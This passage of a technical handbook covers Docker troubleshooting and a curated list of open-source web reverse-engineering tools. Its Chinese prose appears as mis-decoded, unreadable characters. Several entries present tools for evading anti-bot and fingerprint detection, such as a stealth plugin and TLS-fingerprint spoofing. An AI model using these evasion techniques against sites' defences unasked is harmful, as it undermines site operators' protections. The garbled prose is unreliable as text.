<span class="w">      </span><span class="nt">retries</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">5</span>

<span class="w">  </span><span class="nt">redis</span><span class="p">:</span>
<span class="w">    </span><span class="nt">healthcheck</span><span class="p">:</span>
<span class="w">      </span><span class="nt">test</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;CMD&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;redis-cli&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;ping&quot;</span><span class="p p-Indicator">]</span>
<span class="w">      </span><span class="nt">interval</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">5s</span>
<span class="w">      </span><span class="nt">timeout</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">3s</span>
<span class="w">      </span><span class="nt">retries</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">5</span>
</code></pre>
      </div>

      <h3 id="é…ç½®æ–‡ä»¶é‡è½½">é…ç½®æ–‡ä»¶é‡è½½</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># é‡æ–°æ„å»ºé•œåƒ</span>
docker-compose<span class="w"> </span>build

<span class="c1"># é‡æ–°åˆ›å»ºå®¹å™¨</span>
docker-compose<span class="w"> </span>up<span class="w"> </span>-d<span class="w"> </span>--force-recreate

<span class="c1"># åªé‡å¯ç‰¹å®šæœåŠ¡</span>
docker-compose<span class="w"> </span>restart<span class="w"> </span>app

<span class="c1"># æŸ¥çœ‹é…ç½®</span>
docker-compose<span class="w"> </span>config
</code></pre>
      </div>

      <hr />

      <h2 id="å¥åº·æ£€æŸ¥">å¥åº·æ£€æŸ¥</h2>

      <h3 id="é…ç½®å¥åº·æ£€æŸ¥">é…ç½®å¥åº·æ£€æŸ¥</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c"># Dockerfile</span>
<span class="k">HEALTHCHECK</span><span class="w"> </span>--interval<span class="o">=</span>30s<span class="w"> </span>--timeout<span class="o">=</span>10s<span class="w"> </span>--start-period<span class="o">=</span>5s<span class="w"> </span>--retries<span class="o">=</span><span class="m">3</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>CMD<span class="w"> </span>curl<span class="w"> </span>-f<span class="w"> </span>http://localhost:8000/health<span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nb">exit</span><span class="w"> </span><span class="m">1</span>
</code></pre>
      </div>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># docker-compose.yml</span>
<span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="nt">app</span><span class="p">:</span>
<span class="w">    </span><span class="nt">healthcheck</span><span class="p">:</span>
<span class="w">      </span><span class="nt">test</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;CMD&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;curl&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;-f&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;http://localhost:8000/health&quot;</span><span class="p p-Indicator">]</span>
<span class="w">      </span><span class="nt">interval</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">30s</span>
<span class="w">      </span><span class="nt">timeout</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">10s</span>
<span class="w">      </span><span class="nt">retries</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">3</span>
<span class="w">      </span><span class="nt">start_period</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">40s</span>
</code></pre>
      </div>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># æŸ¥çœ‹å¥åº·çŠ¶æ€</span>
docker<span class="w"> </span>ps
docker<span class="w"> </span>inspect<span class="w"> </span>--format<span class="o">=</span><span class="s1">&#39;{{.State.Health.Status}}&#39;</span><span class="w"> </span>container_name
</code></pre>
      </div>

      <hr />

      <h2 id="æ—¥å¿—ç®¡ç†">æ—¥å¿—ç®¡ç†</h2>

      <h3 id="æ—¥å¿—è¿‡å¤§">æ—¥å¿—è¿‡å¤§</h3>

      <p><strong>é—®é¢˜</strong>: å®¹å™¨æ—¥å¿—å ç”¨å¤§é‡ç£ç›˜ç©ºé—´</p>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># docker-compose.yml</span>
<span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="nt">app</span><span class="p">:</span>
<span class="w">    </span><span class="nt">logging</span><span class="p">:</span>
<span class="w">      </span><span class="nt">driver</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;json-file&quot;</span>
<span class="w">      </span><span class="nt">options</span><span class="p">:</span>
<span class="w">        </span><span class="nt">max-size</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;10m&quot;</span>
<span class="w">        </span><span class="nt">max-file</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;3&quot;</span>
</code></pre>
      </div>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># æŸ¥çœ‹æ—¥å¿—å¤§å°</span>
du<span class="w"> </span>-sh<span class="w"> </span>/var/lib/docker/containers/*/*-json.log

<span class="c1"># æ¸…ç†æ—¥å¿—</span>
truncate<span class="w"> </span>-s<span class="w"> </span><span class="m">0</span><span class="w"> </span>/var/lib/docker/containers/*/*-json.log

<span class="c1"># å…¨å±€é…ç½® /etc/docker/daemon.json</span>
<span class="o">{</span>
<span class="w">  </span><span class="s2">&quot;log-driver&quot;</span>:<span class="w"> </span><span class="s2">&quot;json-file&quot;</span>,
<span class="w">  </span><span class="s2">&quot;log-opts&quot;</span>:<span class="w"> </span><span class="o">{</span>
<span class="w">    </span><span class="s2">&quot;max-size&quot;</span>:<span class="w"> </span><span class="s2">&quot;10m&quot;</span>,
<span class="w">    </span><span class="s2">&quot;max-file&quot;</span>:<span class="w"> </span><span class="s2">&quot;3&quot;</span>
<span class="w">  </span><span class="o">}</span>
<span class="o">}</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ€§èƒ½ä¼˜åŒ–">æ€§èƒ½ä¼˜åŒ–</h2>

      <h3 id="å®¹å™¨å¯åŠ¨æ…¢">å®¹å™¨å¯åŠ¨æ…¢</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c"># 1. å‡å°‘å±‚æ•°</span>
<span class="c"># âŒ å¤šå±‚</span>
<span class="k">RUN</span><span class="w"> </span>apt-get<span class="w"> </span>update
<span class="k">RUN</span><span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>-y<span class="w"> </span>package1
<span class="k">RUN</span><span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>-y<span class="w"> </span>package2

<span class="c"># âœ… åˆå¹¶å±‚</span>
<span class="k">RUN</span><span class="w"> </span>apt-get<span class="w"> </span>update<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="se">\</span>
<span class="w">    </span>apt-get<span class="w"> </span>install<span class="w"> </span>-y<span class="w"> </span>package1<span class="w"> </span>package2<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="se">\</span>
<span class="w">    </span>rm<span class="w"> </span>-rf<span class="w"> </span>/var/lib/apt/lists/*

<span class="c"># 2. ä½¿ç”¨ç¼“å­˜</span>
<span class="k">FROM</span><span class="w"> </span><span class="s">python:3.11</span>
<span class="k">WORKDIR</span><span class="w"> </span><span class="s">/app</span>

<span class="c"># å…ˆå®‰è£…ä¾èµ– (å˜åŒ–å°‘)</span>
<span class="k">COPY</span><span class="w"> </span>requirements.txt<span class="w"> </span>.
<span class="k">RUN</span><span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>-r<span class="w"> </span>requirements.txt

<span class="c"># å†å¤åˆ¶ä»£ç  (å˜åŒ–å¤š)</span>
<span class="k">COPY</span><span class="w"> </span>.<span class="w"> </span>.

<span class="c"># 3. é¢„çƒ­é•œåƒ</span>
docker<span class="w"> </span>pull<span class="w"> </span>myimage:latest
docker-compose<span class="w"> </span>pull
</code></pre>
      </div>

      <hr />

      <h2 id="æ¸…ç†å’Œç»´æŠ¤">æ¸…ç†å’Œç»´æŠ¤</h2>

      <h3 id="æ¸…ç†-docker-èµ„æº">æ¸…ç† Docker èµ„æº</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># æ¸…ç†æ‰€æœ‰æœªä½¿ç”¨çš„èµ„æº</span>
docker<span class="w"> </span>system<span class="w"> </span>prune<span class="w"> </span>-a

<span class="c1"># æ¸…ç†å®¹å™¨</span>
docker<span class="w"> </span>container<span class="w"> </span>prune

<span class="c1"># æ¸…ç†é•œåƒ</span>
docker<span class="w"> </span>image<span class="w"> </span>prune<span class="w"> </span>-a

<span class="c1"># æ¸…ç†å·</span>
docker<span class="w"> </span>volume<span class="w"> </span>prune

<span class="c1"># æ¸…ç†ç½‘ç»œ</span>
docker<span class="w"> </span>network<span class="w"> </span>prune

<span class="c1"># æŸ¥çœ‹ç£ç›˜ä½¿ç”¨</span>
docker<span class="w"> </span>system<span class="w"> </span>df
</code></pre>
      </div>

      <hr />

      <h2 id="è°ƒè¯•æŠ€å·§">è°ƒè¯•æŠ€å·§</h2>

      <h3 id="1-ä½¿ç”¨ä¸´æ—¶å®¹å™¨">1. ä½¿ç”¨ä¸´æ—¶å®¹å™¨</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># è¿è¡Œä¸´æ—¶å®¹å™¨è°ƒè¯•</span>
docker<span class="w"> </span>run<span class="w"> </span>-it<span class="w"> </span>--rm<span class="w"> </span>alpine<span class="w"> </span>sh

<span class="c1"># æŒ‚è½½å·è°ƒè¯•</span>
docker<span class="w"> </span>run<span class="w"> </span>-it<span class="w"> </span>--rm<span class="w"> </span>-v<span class="w"> </span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>:/data<span class="w"> </span>alpine<span class="w"> </span>sh
</code></pre>
      </div>

      <h3 id="2-è¦†ç›–å…¥å£ç‚¹">2. è¦†ç›–å…¥å£ç‚¹</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># è¦†ç›– CMD</span>
docker<span class="w"> </span>run<span class="w"> </span>-it<span class="w"> </span>myimage<span class="w"> </span>bash

<span class="c1"># è¦†ç›– ENTRYPOINT</span>
docker<span class="w"> </span>run<span class="w"> </span>-it<span class="w"> </span>--entrypoint<span class="w"> </span>bash<span class="w"> </span>myimage
</code></pre>
      </div>

      <h3 id="3-æ£€æŸ¥ç½‘ç»œ">3. æ£€æŸ¥ç½‘ç»œ</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># è¿›å…¥å®¹å™¨æ£€æŸ¥</span>
docker<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>-it<span class="w"> </span>container_name<span class="w"> </span>bash

<span class="c1"># æµ‹è¯•è¿æ¥</span>
ping<span class="w"> </span>other_container
curl<span class="w"> </span>http://other_container:8080
telnet<span class="w"> </span>other_container<span class="w"> </span><span class="m">3306</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ğŸ“š ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#06-Engineering-docker-deployment">Docker éƒ¨ç½²</a></li>
        <li><a href="#09-Templates-docker-setup">Docker é…ç½®æ¨¡æ¿</a></li>
        <li><a href="#06-Engineering-monitoring-and-alerting">ç›‘æ§å‘Šè­¦</a></li>
      </ul>

    </div>

    <div class="section" id="11-Resources-github-projects">
      <h2>81. GitHub Projects</h2>
      <h1 id="å¼€æºé¡¹ç›®æ¨è">å¼€æºé¡¹ç›®æ¨è</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>æœ¬ç« ç²¾é€‰äº† Web é€†å‘å·¥ç¨‹é¢†åŸŸçš„ä¼˜è´¨å¼€æºé¡¹ç›®ï¼Œæ¶µç›–å·¥å…·ã€æ¡†æ¶ã€åº“å’Œå­¦ä¹ èµ„æºã€‚è¿™äº›é¡¹ç›®å¯ä»¥å¸®åŠ©ä½ å¿«é€Ÿå…¥é—¨ã€æå‡æŠ€èƒ½ã€è§£å†³å®é™…é—®é¢˜ã€‚</p>

      <hr />

      <h2 id="æµè§ˆå™¨è‡ªåŠ¨åŒ–">æµè§ˆå™¨è‡ªåŠ¨åŒ–</h2>

      <table>
        <thead>
          <tr>
            <th>é¡¹ç›®åç§°</th>
            <th>Stars</th>
            <th>è¯­è¨€</th>
            <th>ç®€ä»‹</th>
            <th>ä¸»è¦ç‰¹ç‚¹</th>
            <th>å®‰è£…å‘½ä»¤</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong><a href="https://github.com/puppeteer/puppeteer">Puppeteer</a></strong></td>
            <td>87k+</td>
            <td>JavaScript/TypeScript</td>
            <td>Google å®˜æ–¹ Chrome/Chromium è‡ªåŠ¨åŒ–åº“</td>
            <td>â€¢ å®˜æ–¹æ”¯æŒï¼ŒAPI ç¨³å®š<br>â€¢ æ€§èƒ½ä¼˜ç§€<br>â€¢ ç”Ÿæ€ä¸°å¯Œï¼ˆpuppeteer-extra æ’ä»¶ï¼‰</td>
            <td><code>npm install puppeteer</code></td>
          </tr>
          <tr>
            <td><strong><a href="https://github.com/microsoft/playwright">Playwright</a></strong></td>
            <td>63k+</td>
            <td>JavaScript/TypeScript</td>
            <td>å¾®è½¯å¼€å‘çš„è·¨æµè§ˆå™¨è‡ªåŠ¨åŒ–æ¡†æ¶</td>
            <td>â€¢ æ”¯æŒ Chromeã€Firefoxã€Safari<br>â€¢ å¹¶å‘èƒ½åŠ›å¼º<br>â€¢ ç§»åŠ¨ç«¯æ¨¡æ‹Ÿ<br>â€¢ ç½‘ç»œæ‹¦æˆªå’Œä¿®æ”¹</td>
            <td><code>npm install @playwright/test</code></td>
          </tr>
          <tr>
            <td><strong><a href="https://github.com/SeleniumHQ/selenium">Selenium</a></strong></td>
            <td>30k+</td>
            <td>å¤šè¯­è¨€</td>
            <td>æœ€æ—©çš„æµè§ˆå™¨è‡ªåŠ¨åŒ–æ¡†æ¶</td>
            <td>â€¢ æ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€<br>â€¢ æˆç†Ÿç¨³å®š<br>â€¢ ç¤¾åŒºåºå¤§</td>
            <td><code>pip install selenium</code></td>
          </tr>
          <tr>
            <td><strong><a
                  href="https://github.com/berstend/puppeteer-extra">puppeteer-extra-plugin-stealth</a></strong></td>
            <td>6k+</td>
            <td>JavaScript</td>
            <td>Puppeteer åæ£€æµ‹æ’ä»¶</td>
            <td>â€¢ ç»•è¿‡ Webdriver æ£€æµ‹<br>â€¢ ä¼ªé€  Chrome ç‰¹å¾<br>â€¢ è‡ªåŠ¨è§„é¿å¸¸è§åçˆ¬è™«</td>
            <td><code>npm install puppeteer-extra-plugin-stealth</code></td>
          </tr>
        </tbody>
      </table>

      <p><strong>ä½¿ç”¨åœºæ™¯</strong>: è‡ªåŠ¨åŒ–æµ‹è¯•ã€ç½‘é¡µæˆªå›¾/PDFç”Ÿæˆã€çˆ¬è™«å¼€å‘ã€E2Eæµ‹è¯•ã€ç»•è¿‡è‡ªåŠ¨åŒ–æ£€æµ‹</p>

      <hr />

      <h2 id="javascript-åˆ†æ">JavaScript åˆ†æ</h2>

      <table>
        <thead>
          <tr>
            <th>é¡¹ç›®åç§°</th>
            <th>Stars</th>
            <th>è¯­è¨€</th>
            <th>ç®€ä»‹</th>
            <th>ä¸»è¦ç‰¹ç‚¹</th>
            <th>å®‰è£…å‘½ä»¤</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong><a href="https://github.com/babel/babel">Babel</a></strong></td>
            <td>43k+</td>
            <td>JavaScript</td>
            <td>JavaScript ç¼–è¯‘å™¨å’Œ AST å·¥å…·</td>
            <td>â€¢ å¼ºå¤§çš„ AST æ“ä½œèƒ½åŠ›<br>â€¢ ä¸°å¯Œçš„è½¬æ¢æ’ä»¶<br>â€¢ åæ··æ·†æ ¸å¿ƒå·¥å…·</td>
            <td><code>npm install @babel/core @babel/parser</code></td>
          </tr>
          <tr>
            <td><strong><a
                  href="https://github.com/javascript-obfuscator/javascript-obfuscator">javascript-obfuscator</a></strong>
            </td>
            <td>9k+</td>
            <td>JavaScript</td>
            <td>JavaScript ä»£ç æ··æ·†å·¥å…·</td>
            <td>â€¢ å¤šç§æ··æ·†é€‰é¡¹<br>â€¢ å­—ç¬¦ä¸²åŠ å¯†<br>â€¢ æ§åˆ¶æµå¹³å¦åŒ–</td>
            <td><code>npm install javascript-obfuscator</code></td>
          </tr>
          <tr>
            <td><strong><a href="https://github.com/j4k0xb/webcrack">webcrack</a></strong></td>
            <td>2k+</td>
            <td>TypeScript</td>
            <td>Webpack bundle åæ··æ·†å·¥å…·</td>
            <td>â€¢ è‡ªåŠ¨è¯†åˆ« Webpack æ‰“åŒ…<br>â€¢ æå–æ¨¡å—ä»£ç <br>â€¢ è¿˜åŸç›®å½•ç»“æ„</td>
            <td><code>npm install -g webcrack</code></td>
          </tr>
          <tr>
            <td><strong><a href="https://github.com/lelinhtinh/de4js">de4js</a></strong></td>
            <td>1.5k+</td>
            <td>JavaScript</td>
            <td>åœ¨çº¿ JavaScript åæ··æ·†å·¥å…·</td>
            <td>â€¢ æ”¯æŒå¤šç§æ··æ·†æ ¼å¼<br>â€¢ åœ¨çº¿ä½¿ç”¨ï¼Œæ— éœ€å®‰è£…<br>â€¢ å¯è§†åŒ–å±•ç¤º</td>
            <td>åœ¨çº¿ç‰ˆ: https://lelinhtinh.github.io/de4js/</td>
          </tr>
        </tbody>
      </table>

      <p><strong>ä½¿ç”¨åœºæ™¯</strong>: JavaScript åæ··æ·†ã€ä»£ç è½¬æ¢ã€AST åˆ†æã€Webpack æ‰“åŒ…ä»£ç åˆ†æã€äº†è§£æ··æ·†æŠ€æœ¯</p>

      <hr />

      <h2 id="ç½‘ç»œæŠ“åŒ…ä¸åˆ†æ">ç½‘ç»œæŠ“åŒ…ä¸åˆ†æ</h2>

      <table>
        <thead>
          <tr>
            <th>é¡¹ç›®åç§°</th>
            <th>Stars</th>
            <th>è¯­è¨€</th>
            <th>ç®€ä»‹</th>
            <th>ä¸»è¦ç‰¹ç‚¹</th>
            <th>å®‰è£…å‘½ä»¤</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong><a href="https://github.com/mitmproxy/mitmproxy">mitmproxy</a></strong></td>
            <td>35k+</td>
            <td>Python</td>
            <td>å¼ºå¤§çš„ MITM ä»£ç†å·¥å…·</td>
            <td>â€¢ å‘½ä»¤è¡Œå’Œ Web ç•Œé¢<br>â€¢ æ”¯æŒ HTTP/HTTPS<br>â€¢ Python è„šæœ¬å®šåˆ¶<br>â€¢ è‡ªåŠ¨åŒ– API</td>
            <td><code>pip install mitmproxy</code></td>
          </tr>
          <tr>
            <td><strong><a href="https://github.com/avwo/whistle">Whistle</a></strong></td>
            <td>14k+</td>
            <td>JavaScript</td>
            <td>åŸºäº Node.js çš„æŠ“åŒ…è°ƒè¯•ä»£ç†å·¥å…·</td>
            <td>â€¢ Web å¯è§†åŒ–ç•Œé¢<br>â€¢ è§„åˆ™é…ç½®çµæ´»<br>â€¢ æ”¯æŒ HTTPSã€WebSocket<br>â€¢ æ’ä»¶æ‰©å±•</td>
            <td><code>npm install -g whistle &amp;&amp; w2 start</code></td>
          </tr>
          <tr>
            <td><strong><a href="https://github.com/ahmadnassri/har-validator">har-validator</a></strong></td>
            <td>140+</td>
            <td>JavaScript</td>
            <td>HAR (HTTP Archive) æ–‡ä»¶éªŒè¯å’Œè§£æ</td>
            <td>â€¢ éªŒè¯ HAR æ ¼å¼<br>â€¢ æå–è¯·æ±‚/å“åº”æ•°æ®<br>â€¢ å‘½ä»¤è¡Œå·¥å…·</td>
            <td><code>npm install har-validator</code></td>
          </tr>
        </tbody>
      </table>

      <p><strong>ä½¿ç”¨åœºæ™¯</strong>: ç§»åŠ¨ç«¯æŠ“åŒ…ã€API åˆ†æã€è¯·æ±‚é‡æ”¾ã€å‰ç«¯è°ƒè¯•ã€API Mockã€è·¨åŸŸé—®é¢˜è°ƒè¯•ã€HAR æ–‡ä»¶åˆ†æ</p>

      <hr />

      <h2 id="åŠ å¯†ä¸è§£å¯†">åŠ å¯†ä¸è§£å¯†</h2>

      <table>
        <thead>
          <tr>
            <th>é¡¹ç›®åç§°</th>
            <th>Stars</th>
            <th>è¯­è¨€</th>
            <th>ç®€ä»‹</th>
            <th>ä¸»è¦ç‰¹ç‚¹</th>
            <th>è®¿é—®æ–¹å¼</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong><a href="https://github.com/gchq/CyberChef">CyberChef</a></strong></td>
            <td>26k+</td>
            <td>JavaScript</td>
            <td>&#8220;ç½‘ç»œç‘å£«å†›åˆ€"ï¼Œæ•°æ®å¤„ç†å·¥å…·</td>
            <td>â€¢ 200+ æ“ä½œï¼ˆç¼–ç ã€åŠ å¯†ã€å‹ç¼©ç­‰ï¼‰<br>â€¢ æ‹–æ‹½å¼æ“ä½œæµç¨‹<br>â€¢ æ— éœ€ç¼–ç¨‹</td>
            <td>åœ¨çº¿ç‰ˆ: https://gchq.github.io/CyberChef/</td>
          </tr>
          <tr>
            <td><strong><a href="https://github.com/brix/crypto-js">crypto-js</a></strong></td>
            <td>15k+</td>
            <td>JavaScript</td>
            <td>JavaScript åŠ å¯†åº“</td>
            <td>â€¢ å¸¸ç”¨åŠ å¯†ç®—æ³•ï¼ˆMD5ã€SHAã€AESã€RSAï¼‰<br>â€¢ çº¯ JavaScript å®ç°<br>â€¢ æµè§ˆå™¨å’Œ Node.js é€šç”¨</td>
            <td><code>npm install crypto-js</code></td>
          </tr>
        </tbody>
      </table>

      <p><strong>ä½¿ç”¨åœºæ™¯</strong>: æ•°æ®è½¬æ¢ã€åŠ å¯†è§£å¯†ã€æ ¼å¼åˆ†æã€åŠ å¯†ç®—æ³•è¯†åˆ«ã€å‚æ•°ç­¾åå¤ç°</p>

      <hr />

      <h2 id="æŒ‡çº¹è¯†åˆ«">æŒ‡çº¹è¯†åˆ«</h2>

      <table>
        <thead>
          <tr>
            <th>é¡¹ç›®åç§°</th>
            <th>Stars</th>
            <th>è¯­è¨€</th>
            <th>ç®€ä»‹</th>
            <th>ä¸»è¦ç‰¹ç‚¹</th>
            <th>è®¿é—®æ–¹å¼</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong><a href="https://github.com/fingerprintjs/fingerprintjs">FingerprintJS</a></strong></td>
            <td>22k+</td>
            <td>TypeScript</td>
            <td>æµè§ˆå™¨æŒ‡çº¹è¯†åˆ«åº“</td>
            <td>â€¢ 99.5% å‡†ç¡®ç‡<br>â€¢ Canvas/WebGL/Audio æŒ‡çº¹<br>â€¢ å…è´¹å¼€æºç‰ˆæœ¬</td>
            <td><code>npm install @fingerprintjs/fingerprintjs</code></td>
          </tr>
          <tr>
            <td><strong><a href="https://github.com/abrahamjuliot/creepjs">creepjs</a></strong></td>
            <td>2k+</td>
            <td>JavaScript</td>
            <td>æµè§ˆå™¨æŒ‡çº¹å’Œç‰¹å¾æ£€æµ‹</td>
            <td>â€¢ æ£€æµ‹æµè§ˆå™¨ä¼ªé€ <br>â€¢ å±•ç¤ºæ‰€æœ‰æŒ‡çº¹ä¿¡æ¯<br>â€¢ åœ¨çº¿ Demo</td>
            <td>åœ¨çº¿ç‰ˆ: https://abrahamjuliot.github.io/creepjs/</td>
          </tr>
        </tbody>
      </table>

      <p><strong>ä½¿ç”¨åœºæ™¯</strong>: äº†è§£æŒ‡çº¹æŠ€æœ¯ã€åæŒ‡çº¹æµ‹è¯•ã€æŒ‡çº¹æ£€æµ‹å’Œåˆ†æ</p>

      <hr />

      <h2 id="çˆ¬è™«æ¡†æ¶">çˆ¬è™«æ¡†æ¶</h2>

      <table>
        <thead>
          <tr>
            <th>é¡¹ç›®åç§°</th>
            <th>Stars</th>
            <th>è¯­è¨€</th>
            <th>ç®€ä»‹</th>
            <th>ä¸»è¦ç‰¹ç‚¹</th>
            <th>å®‰è£…å‘½ä»¤</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong><a href="https://github.com/scrapy/scrapy">Scrapy</a></strong></td>
            <td>52k+</td>
            <td>Python</td>
            <td>å¼ºå¤§çš„çˆ¬è™«æ¡†æ¶</td>
            <td>â€¢ å¼‚æ­¥é«˜æ€§èƒ½<br>â€¢ ä¸­é—´ä»¶å’Œç®¡é“ç³»ç»Ÿ<br>â€¢ åˆ†å¸ƒå¼çˆ¬è™«æ”¯æŒï¼ˆScrapy-Redisï¼‰<br>â€¢ ä¸°å¯Œçš„æ’ä»¶</td>
            <td><code>pip install scrapy</code></td>
          </tr>
          <tr>
            <td><strong><a href="https://github.com/apify/crawlee">crawlee</a></strong></td>
            <td>14k+</td>
            <td>TypeScript</td>
            <td>Node.js Web çˆ¬è™«å’ŒæŠ“å–åº“</td>
            <td>â€¢ æ”¯æŒ Puppeteer/Playwright<br>â€¢ è‡ªåŠ¨é‡è¯•å’Œé˜Ÿåˆ—ç®¡ç†<br>â€¢ ä»£ç†è½®æ¢<br>â€¢ TypeScript å‹å¥½</td>
            <td><code>npm install crawlee</code></td>
          </tr>
        </tbody>
      </table>

      <p><strong>ä½¿ç”¨åœºæ™¯</strong>: å¤§è§„æ¨¡çˆ¬è™«é¡¹ç›®ã€ç°ä»£ JavaScript çˆ¬è™«</p>

      <hr />

      <h2 id="é€†å‘è¾…åŠ©å·¥å…·">é€†å‘è¾…åŠ©å·¥å…·</h2>

      <table>
        <thead>
          <tr>
            <th>é¡¹ç›®åç§°</th>
            <th>Stars</th>
            <th>è¯­è¨€</th>
            <th>ç®€ä»‹</th>
            <th>ä¸»è¦ç‰¹ç‚¹</th>
            <th>å®‰è£…/ä½¿ç”¨</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong><a href="https://github.com/lwthiker/curl-impersonate">curl-impersonate</a></strong></td>
            <td>6k+</td>
            <td>C</td>
            <td>ä¼ªé€ æµè§ˆå™¨ TLS æŒ‡çº¹çš„ curl</td>
            <td>â€¢ å®Œç¾æ¨¡æ‹Ÿ Chrome/Firefox TLS æŒ‡çº¹<br>â€¢ ç»•è¿‡ JA3 æ£€æµ‹<br>â€¢ å‘½ä»¤è¡Œå·¥å…·</td>
            <td><code>curl_chrome124 https://example.com</code></td>
          </tr>
          <tr>
            <td><strong><a href="https://github.com/encode/httpx">httpx</a></strong></td>
            <td>13k+</td>
            <td>Python</td>
            <td>ä¸‹ä¸€ä»£ Python HTTP å®¢æˆ·ç«¯</td>
            <td>â€¢ HTTP/2 å’Œ HTTP/3 æ”¯æŒ<br>â€¢ åŒæ­¥/å¼‚æ­¥ API<br>â€¢ è¿æ¥æ± </td>
            <td><code>pip install httpx</code></td>
          </tr>
          <tr>
            <td><strong><a href="https://github.com/psf/requests-html">requests-html</a></strong></td>
            <td>14k+</td>
            <td>Python</td>
            <td>ç»“åˆ Requests å’Œ PyQuery çš„ HTML è§£æåº“</td>
            <td>â€¢ JavaScript æ¸²æŸ“ï¼ˆå†…ç½® Chromiumï¼‰<br>â€¢ jQuery é£æ ¼é€‰æ‹©å™¨<br>â€¢ ç®€å•æ˜“ç”¨</td>
            <td><code>pip install requests-html</code></td>
          </tr>
        </tbody>
      </table>

      <p><strong>ä½¿ç”¨åœºæ™¯</strong>: TLS æŒ‡çº¹ç»•è¿‡ã€ç°ä»£ HTTP è¯·æ±‚ã€éœ€è¦ JS æ¸²æŸ“çš„çˆ¬è™«</p>

      <hr />

      <h2 id="webassembly-å·¥å…·">WebAssembly å·¥å…·</h2>

      <table>
        <thead>
          <tr>
            <th>é¡¹ç›®åç§°</th>
            <th>Stars</th>
            <th>è¯­è¨€</th>
            <th>ç®€ä»‹</th>
            <th>ä¸»è¦å·¥å…·</th>
            <th>ä½¿ç”¨ç¤ºä¾‹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong><a href="https://github.com/WebAssembly/wabt">wabt</a></strong></td>
            <td>6k+</td>
            <td>C++</td>
            <td>WebAssembly Binary Toolkit</td>
            <td>â€¢ wasm2watï¼ˆäºŒè¿›åˆ¶è½¬æ–‡æœ¬ï¼‰<br>â€¢ wat2wasmï¼ˆæ–‡æœ¬è½¬äºŒè¿›åˆ¶ï¼‰<br>â€¢ wasm-objdumpï¼ˆåæ±‡ç¼–ï¼‰<br>â€¢ wasm-decompileï¼ˆåç¼–è¯‘ï¼‰</td>
            <td><code>wasm2wat module.wasm -o module.wat</code><br><code>wasm-decompile module.wasm -o module.c</code>
            </td>
          </tr>
        </tbody>
      </table>

      <p><strong>ä½¿ç”¨åœºæ™¯</strong>: Wasm é€†å‘åˆ†æã€Wasm ä»£ç åˆ†æ</p>

      <hr />

      <h2 id="æµè§ˆå™¨æ’ä»¶">æµè§ˆå™¨æ’ä»¶</h2>

      <table>
        <thead>
          <tr>
            <th>æ’ä»¶åç§°</th>
            <th>Stars</th>
            <th>æ”¯æŒæµè§ˆå™¨</th>
            <th>ç®€ä»‹</th>
            <th>ä¸»è¦åŠŸèƒ½</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong><a href="https://github.com/Tampermonkey/tampermonkey">Tampermonkey</a></strong></td>
            <td>4k+</td>
            <td>Chromeã€Firefoxã€Safariã€Edge</td>
            <td>ç”¨æˆ·è„šæœ¬ç®¡ç†å™¨</td>
